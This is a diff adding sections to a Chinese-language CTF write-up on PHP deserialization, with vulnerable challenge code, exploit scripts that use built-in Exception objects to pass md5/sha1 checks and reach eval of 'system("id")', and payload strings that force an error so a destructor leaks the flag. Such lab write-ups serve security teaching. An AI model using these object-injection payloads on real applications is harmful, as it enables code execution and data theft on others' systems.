@@ -60,7 +60,7 @@ $a="flag{ccc}";
 
 ​		核心思路“destruct+toString序列化攻击”配合“序列化字符串逃逸”
 
-### 序列化攻击
+### 序列化链
 
 ​		核心攻击链：利用类B的\_\_destruct魔术方法内的echo，触发类C的\_\_toString魔术方法调用file_get_contents获取flag.php内容。
 
@@ -143,4 +143,173 @@ $_GET['b']='a";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.ph
 
 ​		`s:8:"password";`即为值`O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"`
 `flag.php";}};`对应的变量名。
+
+# Challenge 0X02
+
+## 源码
+
+index.php
+
+```php
+<?php
+ 
+highlight_file(__FILE__);
+ 
+class Timeline {
+    public $var3;
+    function __destruct(){
+        var_dump(md5($this->var1));
+        var_dump(md5($this->var2));
+        if( ($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1) === sha1($this->var2)) ){
+            eval($this->var1);
+        }
+    }
+}
+ 
+unserialize($_GET[1]);
+ 
+?>
+
+```
+
+## 题解
+
+利用原生类的_\_toString方法，_\_toString()魔术方法在类被当做字符串执行时触发，其函数返回值为字符串。
+
+将含有\_\_toString()的实例赋值给$this->var1和$this->var2；由于md5和sha1的参数都是string，会调用\_\_toString()函数，若两个类的\_\_toString返回的字符串相同且类不同就可以实现绕过。
+
+### 寻找包含toString魔术方法的内置类
+
+```php
+<?php
+ 
+$classes = get_declared_classes();
+ 
+foreach ($classes as $class)
+    if (in_array('__toString', get_class_methods($class)))
+        echo $class.PHP_EOL;
+```
+
+基本都是Exception、Error类，我们以Exception类为例：
+
+![](../images/21-6-18_ctf_unserialize_2.png)
+
+### 构造Exception类
+
+**exp1.php**
+
+```php
+<?php
+ 
+
+// error_reporting(0);
+class Exceptiop{
+    protected  $message ;
+    protected  $file ;
+    public function __construct($mess, $file){
+        $this->message = $mess;
+        $this->file = $file;
+    }
+}
+ 
+class Timeline {
+    public $var3;
+    function __construct(){
+        $evalcode = "echo 1; __HALT_COMPILER();";
+        $this->var1 = new Exceptiop($evalcode,"in ");
+        $this->var2 = new Exceptiop($evalcode." in","");
+ 
+    }
+    function cc(){
+        var_dump(md5($this->var1));
+        var_dump(md5($this->var2));
+        echo "<hr>";
+        var_dump(sha1($this->var1));
+        var_dump(sha1($this->var2));
+        var_dump(($this->var1));
+        var_dump(($this->var2));
+        echo "<hr>\n";
+        if($this->var1 !=$this->var2 && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1) === sha1($this->var2)) ){
+           echo "123";
+        }
+    }
+}
+ 
+$t = new Timeline();
+$t1 = str_replace("Exceptiop","Exception",serialize($t));
+$dd = unserialize($t1);
+// $dd->cc();
+echo urlencode($t1);
+?>
+```
+
+$file参数用来控制类不同和toString相同，HALT_COMPILER()控制php执行停止.
+
+```
+        $evalcode = "echo 1; __HALT_COMPILER();";
+        $this->var1 = new Exceptiop($evalcode,"in ");
+        $this->var2 = new Exceptiop($evalcode." in","");
+```
+
+**exp2.php**
+
+```php
+<?php
+ 
+class Timeline {
+    public $var3;
+    function __destruct(){
+        var_dump(md5($this->var1));
+        var_dump(md5($this->var2));
+        if( ($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1)=== sha1($this->var2)) ){
+            eval($this->var1);
+        }
+    }
+}
+ 
+$ex1 = new Exception('system("id");?>');$ex2 = new Exception('system("id");?>',1); 
+$wtf = new Timeline();
+$wtf->var1 = $ex1;
+$wtf->var2 = $ex2;
+ 
+echo urlencode(serialize($wtf));
+
+```
+
+# Challenge 0X02
+
+## 源码
+
+index.php
+
+```php
+<?php
+
+$line = $_GET[1];
+
+$flag = file_get_contents('/flag');
+
+class B {
+  function __destruct() {
+    global $flag;
+    echo $flag;
+  }
+}
+
+$a = @unserialize($line);
+
+throw new Exception('Well that was unexpected…');
+
+echo $a;
+```
+
+## 题解
+
+核心思想是让序列化字符串报错：
+
+```php
+payload1: a:2:{i:7;O:1:"B":0:{}}
+payload2: O:1:"B":1337:{}
+payload3: O:1:"B":0:{"1337":0}
+```
 
